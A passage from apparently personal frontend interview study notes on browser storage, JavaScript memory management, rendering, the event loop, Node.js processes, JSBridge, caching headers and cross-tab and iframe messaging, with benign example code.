- Caching application data to speed up load times and reduce dependency on network requests.
- Storing game progress or application states that can be resumed later.

### SessionStorage

SessionStorage is similar to LocalStorage in many ways but is designed for storage that lasts only for the duration of the page session. It's perfect for data that doesn't need to persist beyond the current tab or window.

**Features:**

- **Tab-Specific Storage:** Unique storage space for each tab or window, cleared automatically when the tab or window is closed.
- **Capacity:** Also offers about 5MB of storage per domain, aligning with LocalStorage.
- **Access:** Allows for synchronous access within the same domain, facilitating quick data retrieval for the session's duration.

**Uses:**

- Suitable for storing data related to user input, form states, or selections within a single session, preventing data loss when navigating pages.
- Temporary storage of application states that should not be retained after the session ends.
- Facilitating state management in single-page applications (SPAs) for a seamless user experience without persisting data beyond necessity.

### Cookies

Cookies are fundamentally different from LocalStorage and SessionStorage in that they are intended to be sent to and from the server with each HTTP request. This makes them a powerful tool for session management and tracking user activity.

**Features:**

- **Server Communication:** Automatically included with every HTTP request, making them ideal for authentication and state management.
- **Capacity:** Limited to about 4KB per cookie, which constrains their use to smaller data sets.
- **Expiration:** Can be set with a specific expiration date, after which they're deleted automatically, supporting both session-based and persistent storage strategies.

**Uses:**

- Managing user sessions by storing session identifiers, enabling users to remain logged in between visits.
- Storing user preferences or settings that influence server-side rendering or content delivery.
- Implementing tracking mechanisms for analytics, user behavior analysis, or targeted advertising.

### Choosing the Right Storage Mechanism

- **LocalStorage** shines for storing larger amounts of data that need to persist over long periods, without the overhead of server communication. It's best for enhancing client-side experience with minimal impact on performance.
- **SessionStorage** offers a transient storage solution for sensitive or temporary data, ensuring that information is not retained beyond the necessary scope of the user's session.
- **Cookies** remain a staple for scenarios requiring server-side access to client data, especially for authentication, session management, and personalization efforts. Their small size and automatic transmission with HTTP requests make them indispensable for certain tasks, albeit with considerations for security and performance.

## Explain how the stack is used in memory management for frontend applications
It operates on a Last In, First Out (LIFO) principle, efficiently managing function calls and primitive data types. When a function is invoked, its variables are pushed onto the stack, and upon the function's completion, they are removed. This system is particularly suitable for handling temporary, short-lived data. However, the stack's limited size means excessive usage can result in a stack overflow error.

## Explain how the heap is used in memory management for frontend web applications
It's used for dynamic allocation, primarily for objects and complex data structures. Unlike the stack, the heap is a larger, unstructured memory pool that requires manual management. Memory allocation and deallocation in the heap are handled by the JavaScript engine, which includes tasks like object creation and garbage collection.

## Explain the difference between primitive types and reference types
In JavaScript, primitive types and reference types are stored and accessed differently, which affects how they are used in programming.

Primitive types, such as `number`, `string`, `boolean`, `null`, `undefined`, `symbol`, and `bigint`, are stored directly in the variable's memory location, usually on the stack. This direct storage enables quick access and efficient memory management, particularly for simple, immutable values.

In contrast, reference types, like `object`, `array`, and `function`, are stored in the heap. When you create a reference type, the JavaScript engine allocates memory in the heap and stores the data there. The variable on the stack then holds a reference (or pointer) to that memory location. This means when you manipulate an object or an array, you're working through a reference. Any changes made to the object or array are reflected across all references to that object, as they all point to the same memory location in the heap.

### Related Topic: Memory Allocation for Objects and Arrays
Understanding how JavaScript allocates memory for objects and arrays is crucial. Since these are reference types, any operation involving copying or passing them around in your code means you're handling references, not the actual data. This behavior can lead to unexpected mutations if not properly managed, and is a fundamental concept in understanding JavaScript's memory management and behavior.

## Garbage Collection in JavaScript

Garbage collection in JavaScript is an automated process that identifies and frees up memory that is no longer being used by the application. This process is vital for preventing memory leaks and ensuring efficient memory usage. JavaScript implements garbage collection primarily through the following methods:

1. **Reference Counting**: In this method, the garbage collector counts the number of references to a value. When the reference count drops to zero, indicating that no part of the program is using that value, it is considered garbage and eligible for collection. However, reference counting has a significant limitation with circular references, where two objects reference each other, leading to memory leaks as their reference count never reaches zero.

2. **Mark-and-Sweep Algorithm**: Modern JavaScript engines, such as V8 (Chrome, Node.js) and SpiderMonkey (Firefox), use the Mark-and-Sweep algorithm. This method involves marking "roots" (variables directly referenced by the code being run, plus global variables). The garbage collector then traverses from these roots and marks all reachable objects. Objects not marked as reachable are considered unreachable and eligible for garbage collection. This approach effectively resolves the issue of circular references found in reference counting.

## Closures and Memory Leaks in JavaScript

Closures in JavaScript are not inherent sources of memory leaks. They are essential features that allow functions to access and remember variables from their lexical scope, even after the outer function has executed. However, if closures retain references to extensive scopes or objects longer than needed, they can contribute to memory leaks. This typically occurs when a closure, no longer in use, is still referenced in the code, preventing the garbage collector from freeing the memory of the scope's variables. Developers can prevent such issues by carefully managing the lifecycle of closures and ensuring they are dereferenced when no longer needed. This is particularly important in scenarios with loops or large objects.

## Detecting Memory Leaks in JavaScript and React

To detect memory leaks in JavaScript and React, tools like the Chrome Developer Tools are invaluable. The Performance tab in these tools allows developers to record memory usage while interacting with the application. Observing the heap usage over time helps identify potential memory leaks, indicated by a continuous increase in memory usage without drops after garbage collection cycles. 

Common scenarios leading to memory leaks in React include:
- Unmanaged event listeners
- Uncleared timers
- Misuse of external libraries
- Improper handling of state and props

Preventing memory leaks involves proactive resource management, such as removing event listeners and clearing timers when components unmount.

## WeakMap and WeakSet in JavaScript
WeakMap and WeakSet in JavaScript are collections that store objects weakly, meaning their elements are not prevented from being garbage-collected. They are often used in managing caches, tracking object references, and keeping metadata about objects without affecting their lifecycle.

- **WeakMap**: Allows associating data with objects without preventing their garbage collection. This is useful for private data or caches that do not interfere with the lifecycle of the objects. Ideal for situations where you want to avoid creating memory leaks by inadvertently retaining references to objects.

- **WeakSet**: Enables tracking a group of objects for presence checks without affecting their garbage collection. This is useful for tracking which objects have undergone a specific process without creating memory leaks.

## Describe the Complete Process of Entering a URL to Presenting the Page

When a URL is entered into a browser, the process from initiating a web request to the final rendering of the page involves several critical steps. Here is a detailed breakdown:

### Web Request
1. **DNS Lookup**: The browser initiates a DNS query to convert the hostname in the URL into an IP address. This process may involve querying multiple DNS servers.
2. **TCP Connection**: Establishes a TCP connection with the server using a three-way handshake. This ensures a reliable communication channel.
3. **HTTP Request**: The browser sends an HTTP request to the server's IP address, requesting the webpage content.
4. **Server Response**: The server processes the request and sends back a response, typically including the HTML source code of the page.

### Parsing HTML
1. **Resource Fetching**: As the browser parses the HTML, it may encounter references to external resources such as JavaScript, CSS, images, and videos. Each of these resources may require additional DNS lookups, TCP connections, and HTTP requests.
2. **DOM and CSSOM Trees**: The browser converts the HTML document into a structured format known as the Document Object Model (DOM). Simultaneously, CSS files are processed into the CSS Object Model (CSSOM) or style tree.
3. **Render Tree Construction**: The DOM and CSSOM trees are combined to form the render tree, which represents all visible elements on the page and their styles.
4. **Optimization**: To optimize loading and parsing:
   - CSS is typically placed in the `<head>` to avoid rendering blocks.
   - JavaScript files are placed at the end of the `<body>` or loaded with `defer` or `async` attributes to not block HTML parsing.
   - Specifying image dimensions helps in layout calculation and prevents reflows.

### Rendering the Page
1. **Layout Calculation**: The browser calculates the size and position of each element in the render tree.
2. **Painting**: The visible elements are then painted onto the screen.
3. **JavaScript Execution**: JavaScript files are executed, which may modify the DOM and trigger a re-rendering of the page.
4. **Asynchronous Loading**: Some resources, like CSS and images, are fetched asynchronously and may cause the page to render again upon loading.

## Web Performance: Repaint vs. Reflow
### Reflow
Reflow, also known as layout, involves recalculating the positions and dimensions of elements to accurately reflect any changes in the DOM that affect their layout. This calculation is necessary to construct the render tree, which integrates style information with visible elements.

Reflow is computationally intensive as it may affect the layout of the entire page, not just the element being altered. Common triggers include:
- Resizing the browser window.
- Modifying content that affects layout (e.g., adding or removing elements).
- Alterations in style properties (e.g., width, height, margin, padding).

### Repaint
Repaint deals with redrawing the visual styles of elements without affecting their layout. After the layout is determined and the render tree constructed, repaint updates the visual appearance based on style changes.

Repaint is less performance-heavy as it does not involve layout changes. Typical scenarios include:
- Changes in visibility, colors, or shadows.
- Adjustments to backgrounds or borders.

### Comparing Reflow and Repaint
Reflow will trigger a repaint, but a repaint does not necessarily cause a reflow.

#### **Performance Costs**
The primary distinction lies in their impact on performance:
- **Reflows** can affect the entire page and are therefore more costly.
- **Repaints** affect only the appearance, without layout changes, making them less resource-intensive.

### Optimization Strategies
To minimize performance costs, implement the following practices:

#### **Batch Style Changes**
Group multiple style changes into a single class adjustment to reduce the number of reflows.

#### **Minimize DOM Access**
Modify elements offscreen or within a document fragment to limit the impact on the actual DOM.

#### **Leverage Block Formatting Context**
Using BFC properties can prevent elements from affecting each other’s layout, thus reducing reflows.

#### **Optimize Event Handling**
Implement debouncing or throttling to manage events that cause frequent reflows, such as resizing or scrolling.

#### **Prioritize CSS3 and `requestAnimationFrame`**
For animations, prefer CSS3 and `requestAnimationFrame` over JavaScript-driven animations to decrease both reflow and repaint occurrences.

## What is the difference between `defer` and `async` attributes in `<script>` elements?

The `<script>` element can be used to include JavaScript in HTML documents. When scripts are loaded and executed, they can affect how quickly a page becomes interactive. The `defer` and `async` attributes provide different ways to control this behavior.

### `defer` for Deferred Execution
The `defer` attribute tells the browser to continue parsing the HTML document while the script is being downloaded asynchronously. The key point is that the script execution is deferred until the entire HTML document has been parsed. This means that scripts with `defer` will not run until the HTML parsing is complete, which is similar to placing a `<script>` tag at the end of the `<body>` element. However, `defer` ensures that scripts are executed in the order they appear in the document, which is not guaranteed when scripts are manually placed at the bottom of the `<body>`. 

### `async` for Asynchronous Execution
The `async` attribute also allows the script to be downloaded in parallel to HTML parsing. However, unlike `defer`, `async` scripts are executed as soon as they are downloaded, which could be before or after the HTML parsing is complete. This means the execution order of scripts is not guaranteed. `async` is best used for scripts that do not depend on other scripts and do not modify the DOM (Document Object Model).

### If Neither `defer` nor `async` is Provided
If neither `defer` nor `async` is provided, the script is fetched and executed immediately, blocking the HTML parsing until the script is downloaded and executed. This can lead to slower page load times, especially for large scripts.

## Difference between HTMLCollection and NodeList

HTML and the Document Object Model (DOM) are essential components of web development. Understanding different parts of the DOM, such as `HTMLCollection` and `NodeList`, is crucial for manipulating web pages effectively.

- **HTMLCollection**: This is a live collection of HTML elements. It updates automatically when the DOM changes. `HTMLCollection` exclusively contains `Element` nodes, typically returned by methods like `document.getElementsByClassName` and the `.children` property of an element.

- **NodeList**: A more general collection that can include different types of nodes, not just elements. This can be live or static, depending on how it's obtained. For example, `NodeList` returned by `Node.childNodes` is live, but the one returned by `document.querySelectorAll` is static.

### Difference between HTMLCollection and NodeList

1. **Node Types**: `HTMLCollection` is limited to `Element` nodes, while `NodeList` can include any node types, such as `Element`, `Text`, and `Comment`.

2. **Dynamism**: `HTMLCollection` is always live, meaning it reflects DOM changes immediately. `NodeList` can be either live or static. Live `NodeList`s reflect DOM changes, whereas static ones do not.

### `.children` vs `.childNodes`

Considering the following HTML snippet:

```html
<p id='p1'>
    <em>hello</em> hello <b>bold</b><!-- comment -->
</p>
```

- `p.children` refers to an `HTMLCollection` containing only element nodes within `p` (`<em>` and `<b>` in this case). It does not include text nodes or comments.

- `p.childNodes` refers to a `NodeList` and includes all node types - `Element`, `Text`, and `Comment`. It will contain `<em>`, text nodes (including the 'hello' text), `<b>`, and the comment node.

- `p.tagName` and `p.nodeName` are properties used to get the tag name of an element. `p.tagName` is used specifically for elements and returns the tag name in uppercase, while `p.nodeName` is applicable to all types of nodes and returns the name of the node (the tag name for elements in uppercase).

In summary, `HTMLCollection` and `NodeList` are key concepts in DOM manipulation, each with its specific use cases. Understanding their differences is vital for efficient and effective front-end web development.

## Difference Between Browser and Node.js Event Loop

JavaScript is designed to operate in a single-threaded manner, utilizing the event loop mechanism to manage asynchronous operations, which allows for non-blocking execution. 

### Micro-tasks and Macro-tasks

- **Macro-tasks**: Include operations such as `setTimeout`, `setInterval`, and various web API calls. These tasks are queued to run after the current script has completed execution and the micro-task queue has been cleared.
- **Micro-tasks**: Generally related to promise operations, including async/await. These tasks are executed immediately after the current script ends, prior to any pending macro-tasks, giving them a higher priority in execution.

### Example Scenario

```javascript
console.log('Start');

setTimeout(() => console.log('Timeout 1'), 0);

new Promise((resolve) => {
  console.log('Promise 1');
  resolve();
  console.log('Promise 1 then');
}).then(() => console.log('Promise 2'));

console.log('End');
```

**Output**:
```
Start
Promise 1
Promise 1 then
End
Promise 2
Timeout 1
```

Note that the Promise constructor is executed synchronously, while the `then` callback is queued as a micro-task, ensuring its execution before the `setTimeout` callback.

### Browser Event Loop

- In the browser, the event loop operates on the main thread alongside activities such as DOM rendering, which requires careful task management to avoid UI disruptions.
- Task management in browsers involves two queues: macro-tasks and micro-tasks, with micro-tasks receiving higher priority. This arrangement ensures prompt processing of operations like promise resolutions, often before rendering the next frame.

### Node.js Event Loop

- In contrast, Node.js organizes macro-tasks and micro-tasks into distinct types and priorities suitable for backend operations, focusing on efficient I/O handling rather than UI responsiveness.
- **Macro-task types in Node.js**, listed in order of priority:
  - **Timers**: Scheduling tasks like `setTimeout` and `setInterval`.
  - **I/O Callbacks**: Managing errors related to network, streams, and TCP.
  - **Idle/Prepare**: Internal tasks of the Node.js engine.
  - **Poll**: Fetching new I/O events.
  - **Check**: Handling `setImmediate` callbacks.
  - **Close Callbacks**: Executing callbacks such as `socket.on('close')`.

- **Micro-task types in Node.js**:
  - **`process.nextTick`**: Allows deferring the execution of a callback until after the current operation, with a very high priority.
  - **Promise/async/await**: Manages asynchronous operations effectively.

- Node.js processes all micro-tasks (with `process.nextTick` as the highest priority) after the initial execution of synchronous code, followed by macro-tasks. During macro-task execution, it continues to process emerging micro-tasks.

The fundamental concept of the event loop is shared between the browser and Node.js, enabling asynchronous execution within a single-threaded context. However, their specific implementations reflect the different priorities and operational needs of the two environments: UI responsiveness in browsers and efficient I/O processing in Node.js.

## Node.js Process Creation and Communication

### Process vs Thread
- **Process**: A process is the minimum unit for an Operating System (OS) to allocate resources and scheduling. It operates within its own independent memory space, ensuring that processes do not interfere with each other's operations.
- **Thread**: A thread is the smallest unit of processing within a process. It shares the memory space of its parent process, allowing for efficient execution of concurrent operations within the same application. JavaScript, while operating on a single-threaded model, supports multithreading through mechanisms like Web Workers for web applications.

### Why Use Multiprocessing in JavaScript?
- **Utilization of Multi-core CPUs**: It allows applications to leverage multi-core CPU architectures, significantly improving computation speed and application responsiveness.
- **Memory Limitations**: Each Node.js process has a memory limit. Multiprocessing enables an application to surpass the memory limitations of a single process, utilizing more memory collectively across multiple processes.
- **Efficiency and Performance**: Multiprocessing can lead to better resource utilization, enhanced performance, and reduced execution times by distributing workload across multiple CPU cores.
- **Application Methods**: In the context of web applications, `WebWorker` is utilized for multiprocessing to offload tasks from the main thread. For server-side applications using Node.js, multiprocessing is achieved through the `fork` or `cluster` modules, facilitating concurrent execution of tasks and improved application scalability.

### Fork in Node.js
The `fork` method is a part of the `child_process` module in Node.js, designed to create child processes. Here is a example illustrating how to use `fork`:

```javascript
// Main process (e.g., server.js)
const http = require('http');
const { fork } = require('child_process');

const server = http.createServer((req, res) => {
    if (req.url === '/compute') {
        const computeProcess = fork('./compute.js');
        computeProcess.send('Start');

        computeProcess.on('message', (result) => {
            res.end(`Result: ${result}`);
        });

        computeProcess.on('exit', () => console.log('Computation process exited'));
    } else {
        res.end('Server is running');
    }
});

server.listen(3000, () => console.log('Server listening on port 3000'));

// Child process (e.g., compute.js)
process.on('message', (msg) => {
    if (msg === 'Start') {
        let sum = 0;
        for (let i = 0; i < 10000; i++) sum += i;
        process.send(sum);
        process.exit(0);
    }
});
```

### Cluster in Node.js
The `cluster` module in Node.js enables the creation of child processes that share server ports, facilitating load balancing across multiple CPU cores. Below is a example of using `cluster`:

```javascript
const cluster = require('cluster');
const http = require('http');
const numCPUs = require('os').cpus().length;

if (cluster.isMaster) {
    console.log(`Master process is running with PID: ${process.pid}`);

    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker) => {
        console.log(`Worker ${worker.process.pid} died. Restarting...`);
        cluster.fork();
    });
} else {
    http.createServer((req, res) => {
        res.writeHead(200);
        res.end('Hello from Node.js!');
    }).listen(8000);

    console.log(`Worker started with PID: ${process.pid}`);
}
```

**Best Practices**:
- **PM2 for Process Management**: In production, consider using PM2 or similar tools for advanced process management and load balancing. These tools offer more sophisticated monitoring, logging, and clustering features.
- **Fork vs. Cluster Usage**:
  - **Fork**: Best suited for offloading CPU-intensive tasks to child processes, thereby preventing the main application thread from blocking.
  - **Cluster**: Ideal for creating redundant worker processes in server applications, enhancing availability and fault tolerance, especially under high load.

## Describe JS-bridge principles

### What is JS-bridge
JSBridge serves as a middleware between native applications and JavaScript running within a webview. JavaScript cannot directly invoke native APIs due to the sandboxed nature of web content for security reasons. A JSBridge provides a structured interface through which JavaScript can communicate with the native side of an application. This enables web content to access device features or native functionality that is otherwise inaccessible to pure web applications. For example, within the Facebook app, it's possible to open H5 websites; this is facilitated by JSBridge, allowing the web content to interact with the app's native features.

### Frequent used methods to achieve JS-Bridge

1. **Global API Registration**: This method involves exposing native functions as global JavaScript functions that can be called directly from the web content. However, this approach may encounter issues with asynchronous execution, such as delays in reading from local files or fetching data over the network. For example:

```js
// Incorrect: const version = window.getVersion() // getVersion is from bridge, but have problem of lag at async, e.g. read from local file or web
async function getVersion() {
  return new Promise((resolve, reject) => {
    if (window.bridge && window.bridge.getVersion) {
      resolve(window.bridge.getVersion());
    } else {
      reject('Bridge or getVersion method not found.');
    }
  });
}
```

2. **URL Scheme (Recommended)**: This technique involves defining custom URL schemes that the native application can recognize and handle. When a webview navigates to a URL with a custom scheme, the app intercepts the request and performs the corresponding native action. This method is more flexible and allows for easy asynchronous communication. A common implementation involves creating invisible iframes to trigger these URL schemes without navigating away from the current page. The example provided showcases an SDK object encapsulating calls to different native functions via URL schemes:

```js
// Example of an SDK object to interface with native app functions through URL schemes
const sdk = {
    invoke(url, data, onSuccess, onError) {
        const iframe = document.createElement('iframe');
        iframe.style.visibility = 'hidden';
        document.body.appendChild(iframe);
        iframe.onload = () => {
            try {
                const content = iframe.contentWindow.document.body.innerHTML;
                onSuccess(JSON.parse(content));
            } catch (error) {
                onError(error);
            } finally {
                iframe.remove();
            }
        };
        iframe.onerror = (error) => {
            onError(error);
            iframe.remove();
        };
        iframe.src = `my-app-name://${url}?data=${encodeURIComponent(JSON.stringify(data))}`;
    },
    fn1(data, onSuccess, onError) {
        this.invoke('api/fn1', data, onSuccess, onError);
    },
    fn2(data, onSuccess, onError) {
        this.invoke('api/fn2', data, onSuccess, onError);
    },
    fn3(data, onSuccess, onError) {
        this.invoke('api/fn3', data, onSuccess, onError);
    }
};
```

## Storing Resources for Quick Rendering in Future Requests
Caching strategies enable browsers to store copies of files locally, reducing load times for repeat visitors and decreasing server load.

### HTTP Headers for Caching
HTTP headers control the caching mechanisms of web resources. Here are the main headers involved:

**Cache-Control**  
The `Cache-Control` header specifies directives for caching mechanisms in both requests and responses. It's critical for defining the duration and manner of caching. Examples include:
- `max-age=<seconds>`: Specifies the maximum amount of time a resource is considered fresh.
- `no-cache`: Requires caches to submit the request to the origin server for validation before releasing a cached copy.
- `private`: Indicates that the response is intended for a single user and should not be stored by shared caches.

**Expires**  
The `Expires` header provides a specific date/time after which the response is considered stale. It is less flexible than `Cache-Control` and is overridden if both headers are present.

**ETag**  
An `ETag` (entity tag) is a unique identifier assigned by a web server to a specific version of a resource. It helps to manage changes to resource files, enabling more efficient caching by allowing web servers to validate if the content has changed since the last fetch.

**Last-Modified**  
The `Last-Modified` header indicates the date and time a resource was last changed. Like `ETag`, this header helps in validating cached resources. If the resource has not been modified since the last fetch, a `304 Not Modified` response can be returned instead of the resource, saving bandwidth.

### Practical Example: Implementing Caching with HTTP Headers
To illustrate the use of these headers in practice, consider the following scenario:
You have a website with a JavaScript file that rarely changes. To ensure that users don't download this file every time they visit your site, you can set HTTP headers as follows:

```http
Cache-Control: public, max-age=31536000
ETag: "abcd1234"
```

In this example:
- `Cache-Control` instructs the browser that the file can be cached and considered fresh for one year (31,536,000 seconds).
- The `ETag` header provides a unique version identifier, allowing the browser to check if the file has changed since the last download.

Using these headers correctly can significantly enhance user experience by speeding up load times and reducing server load.

## How are Hybrid Templates Updated?
### Template Management and Version Control
Effective template management is achieved through systematic version control and careful organization:

1. **CMS Upload:** Templates are uploaded to a template server via a content management system (CMS), ensuring that all digital assets are centrally managed.
2. **Version Tagging:** Each template upload is tagged with a unique version identifier (e.g., v1.0, v1.1). This practice supports effective iteration management, facilitates easy rollback in case of issues, and simplifies version comparisons.

### Template Integration in Applications
Templates are integrated into applications through a series of steps that ensure their proper utilization and rendering:

1. **Template Retrieval:** Applications fetch the latest template versions from the server as needed, downloading essential files including HTML, JavaScript (JS), and Cascading Style Sheets (CSS).
2. **Webview Rendering:** The application's view layer utilizes a webview to render the downloaded content. Files are accessed through a URL scheme (e.g., `file://`), allowing for isolated and secure rendering within the app.
3. **Dynamic Data Rendering:** Webviews make AJAX calls to an API server to retrieve necessary data. This data is then dynamically populated into the HTML templates, creating a personalized user experience.

### Template Update Triggers
The timing of template updates is crucial to maintain both performance and user experience:

- **At Launch:** Each time the application is launched, it checks for and downloads any available new templates.
- **Periodic Updates:** Regular checks (e.g., every 5 minutes) are scheduled to ensure the application has the most current template, balancing the need for freshness with performance considerations.

### Managing Template Updates
The update process is designed to minimize disruption and maximize application performance:

1. **Performance Considerations:** Direct downloads of new templates at the time of detection can adversely affect the app’s responsiveness, particularly under poor network conditions.
2. **Background Processing:** To avoid performance hits, new templates are downloaded in the background, allowing the application to continue operating with the current version until the update is ready.
3. **Seamless Switch:** Upon successful download, the application seamlessly transitions to the new template version without interrupting the user experience, ensuring a smooth and imperceptible update process.

## Browser Event Transfer Process

Events in the DOM can propagate in two key phases: capturing and bubbling. This section explains these phases and how React manages event propagation using its synthetic event system.

### Event Propagation Phases

**Event propagation** in the DOM occurs in three distinct phases:

#### 1. Capture Phase
- **Description**: During the capture phase, the event starts from the root node of the DOM and travels downward towards the target node, passing through each intermediary node.
- **Purpose**: This phase allows for the interception of events before they reach their intended target.

#### 2. Target Phase
- **Description**: The target phase is where the event reaches the element that triggered the event.
- **Interaction**: Here, event listeners attached directly to the target node are executed.

#### 3. Bubble Phase
- **Description**: After reaching the target, the event then bubbles up from the target node back to the root of the DOM.
- **Utility**: This phase is used for event delegation, allowing for more efficient memory usage and less complex event management in applications.

### Event Binding in React

React abstracts the DOM's event propagation mechanism through what is known as the **Synthetic Event System**:

- **Synthetic Events**: React creates a cross-browser wrapper around the browser’s native event. This is known as a synthetic event. It has the same interface as the browser’s native event, including `stopPropagation()` and `preventDefault()`, except events work identically across all browsers.
- **Event Delegation**: Instead of binding events to the node itself, React binds events to the document's root node and uses event bubbling to manage events. This helps in optimizing performance and simplifying event handling.
- **Phases Combination**: React does not use the capture phase for most events, but it provides an option to handle an event in the capture phase by appending `Capture` to the event handler's name (e.g., `onClickCapture`).

## How to Implement Multi-Tab Communication on a Website?

Implementing multi-tab communication in web applications allows for the sharing of data and messages between different tabs or windows of the same origin. Here are three common methods to achieve this, along with their advantages, limitations, and use cases.

### 1. Using WebSockets
WebSockets provide a full-duplex communication channel over a single, long-lived connection, enabling real-time data exchange between the client and server.

- **Advantages**:
  - No CORS (Cross-Origin Resource Sharing) limitations, allowing for communication across different domains.
  - Enables real-time, bidirectional communication between the client and server.

- **Limitations**:
  - Requires server-side support, which can be more costly and complex to implement compared to client-side-only solutions.
  - Maintaining a WebSocket connection can be resource-intensive for both the server and client.

- **Use Case**:
  Ideal for applications that require real-time data exchange, such as live chat applications, online gaming, and collaborative editing tools.

### 2. Using `localStorage`
`localStorage` is a web storage API that allows data to be stored in key-value pairs in the browser, and it can be used for communication between tabs within the same origin.

- **Advantages**:
  - Simple to implement and does not require server-side support.
  - Works across tabs within the same origin, making it suitable for sharing data between different parts of the same application.

- **Limitations**:
  - Limited to communication within the same origin.
  - Storage space is limited (typically around 5MB).

- **Example Code**:
  ```html
  <!-- In one tab (e.g., list page) -->
  <script>
      window.addEventListener('storage', event => {
          if (event.key === 'changeInfo') {
              console.info('New info received:', event.newValue);
          }
      });
  </script>
  <!-- In another tab (e.g., detail page) -->
  <script>
      document.getElementById('btn1').addEventListener('click', () => {
          const newInfo = {
              id: 100,
              name: 'Item ' + Date.now()
          };
          localStorage.setItem('changeInfo', JSON.stringify(newInfo));
      });
  </script>
  ```
  - **Key Points**:
    - Tabs A and B are within the same origin.
    - Tab A sets `localStorage`, and Tab B listens for changes in `localStorage`.

### 3. Using `SharedWorker`
`SharedWorker` is a type of Web Worker that allows for the creation of a shared execution environment, accessible by multiple scripts even if they are in different windows, iframes, or tabs.

- **Advantages**:
  - Enables communication and data sharing between tabs, iframes, or windows from the same origin.
  - Offloads work to a background thread, preventing UI blocking.

- **Limitations**:
  - More complex to implement and test compared to other methods.
  - Support across browsers can be inconsistent.
  - Limited to same-origin communication.

- **Example Code**:
  ```html
  <!-- In one tab (e.g., list) -->
  <script>
      const worker = new SharedWorker('worker.js');
      worker.port.onmessage = e => console.info('Message from worker:', e.data);
  </script>
  <!-- In another tab (e.g., detail) -->
  <script>
      const worker = new SharedWorker('worker.js');
      document.getElementById('btn1').addEventListener('click', () => {
          worker.port.postMessage('Message from detail tab');
      });
  </script>
  ```
  ```js
  // worker.js
  const ports = new Set();
  onconnect = event => {
      const port = event.ports[0];
      ports.add(port);
      port.onmessage = e => {
          // Broadcast the message to all connected ports except the sender
          ports.forEach(p => {
              if (p !== port) {
                  p.postMessage(e.data);
              }
          });
      };
      port.postMessage('SharedWorker initialized');
  }
  ```
  - **Key Points**:
    - `SharedWorker` can start a shared process for communication between tabs from the same origin.
    - It is capable of running JavaScript in the background, independent of any particular tab, allowing for more complex inter-tab communication scenarios.

### How to Achieve Communication Between a Website and an Iframe

Communicating between a website and an iframe can be efficiently achieved using the `window.postMessage()` method. This approach allows for secure cross-origin communication without being restricted by CORS (Cross-Origin Resource Sharing) policies. The `postMessage` method enables sending data from the parent page to an iframe or vice versa, regardless of their origin, ensuring a versatile and secure way to interact across different domains.

- **Advantages**:
  - Bypasses CORS restrictions, enabling communication across different origins.
  - Provides a mechanism to verify the origin of the messages, enhancing security.

- **Example Code**:

  - **Child (Iframe Content)**:
    ```html
    <!-- Child HTML content -->
    <p>Child page
      <button id="btn1">Send Message</button>
    </p>
    <script>
        const btn1 = document.getElementById('btn1');
        btn1.addEventListener('click', () => {
            console.info('Child button clicked');
            window.parent.postMessage('Message from child', '*'); // Use specific origin instead of '*' in production
        });

        window.addEventListener('message', event => {
            // Always check the origin of the data!
            if (/* validate event.origin */) {
                console.info('Origin:', event.origin);
                console.info('Child received:', event.data);
            }
        });
    </script>
    ```
  - **Parent**:
    ```html
    <!-- Parent HTML content -->
    <p>Index page
      <button id="btn1">Send Message</button>
    </p>
    <iframe id="iframe1" src="./child.html"></iframe>
    <script>
        const btn1 = document.getElementById('btn1');
        const iframe = document.getElementById('iframe1');

        btn1.addEventListener('click', () => {
            console.info('Parent button clicked');
            iframe.contentWindow.postMessage('Message from parent', '*'); // Use specific origin instead of '*' in production
        });

        window.addEventListener('message', event => {
            // Always validate the origin of the data!
            if (/* validate event.origin */) {
                console.info('Origin:', event.origin);
                console.info('Parent received:', event.data);
            }
        });
    </script>
    ```
- **Key Points**:
  - The `'*'` argument in `postMessage` indicates that the message can be sent to any origin. In production environments, this should be replaced with the specific target origin to prevent security vulnerabilities.
  - It's crucial to validate the `event.origin` in the message event listener to ensure that messages are only accepted from trusted sources. This validation prevents potential cross-site scripting (XSS) attacks.

## Handling Rendering of 100,000 Data Entries

It's essential to first communicate to the interviewer that returning 100,000 data entries in one go is technically impractical. A preferable approach would be to use **pagination** to limit the amount of data sent and rendered at any one time.

Before seeking solutions, assess whether the browser can handle processing 100,000 data entries. While handling such data as strings or simple data structures in JavaScript might be feasible, rendering them directly to the DOM would result in significant performance issues, including sluggishness and potential crashes.

### 1. **Custom Middleware Layer**:
Implement a custom Node.js middleware layer that fetches and processes the 100,000 data entries. The front-end application would then interact with this middleware instead of directly connecting to the backend server.

While this approach can help manage the data more efficiently by pre-processing it before rendering, it is costlier in terms of development time and resources.

### 2. **Virtual Scrolling (Virtual List)**:
Implement virtual scrolling to render only the DOM elements in the viewport. Elements outside the viewport are not rendered but are accounted for in terms of spacing to ensure smooth scrolling. As the user scrolls, elements enter the viewport are rendered, and those leaving the viewport are destroyed or reused.

Implementing virtual scrolling improves application performance significantly by reducing the number of DOM elements that need to be managed at any given time, thereby minimizing browser workload and memory usage.

This method is technically challenging to implement from scratch due to the need to manage the creation and destruction of DOM elements dynamically based on the scroll position. It is highly recommended to use third-party libraries that provide virtual scrolling capabilities.

For Vue.js projects, `Vue-virtual-scroll-list` can be used, and for React projects, `React-virtualized` is a suitable choice. These libraries simplify the implementation of virtual scrolling by handling the complexities of DOM element management based on scroll behavior.

However, even using these libraries, the performance is still a concern for phones and low-end devices. It's important to consider the user experience and the practicality of displaying such a large amount of data at once.

## How to Prevent 300ms Delay for Double Click to Zoom on Mobile Phones?
On mobile web applications, a common issue is the 300ms delay when users attempt to double-click (tap) to zoom. This delay was originally implemented to differentiate between a tap (single click) and a double-tap (double click). However, this can interfere with the responsiveness of web applications. In the past, developers used libraries like FastClick to circumvent this delay. Modern browsers have introduced ways to address this issue by detecting the site's responsiveness through meta tags.

To prevent the 300ms delay on mobile devices without relying on external libraries like FastClick, ensure your web application is using responsive design principles. Implement the following meta tag in your HTML:
```html
<meta name="viewport" content="width=device-width, initial-scale=1">
```
This meta tag informs the browser that your website is optimized for mobile devices, prompting it to disable the 300ms delay for a better user experience. This approach is preferred as it relies on standard responsive design practices rather than additional scripts, improving your website's performance and compatibility.

# 6. VDOM and React and NextJS.md

## Is Virtual DOM (VDOM) fast?

The Virtual DOM (VDOM) is a core concept in modern web development, particularly in frameworks like React and Vue. It's a lightweight representation of the actual DOM (Document Object Model) in the form of JavaScript objects. While the Virtual DOM was popularized by React, it's now widely used across different front-end frameworks due to its advantages in updating user interfaces.

### Understanding Virtual DOM and Its Performance

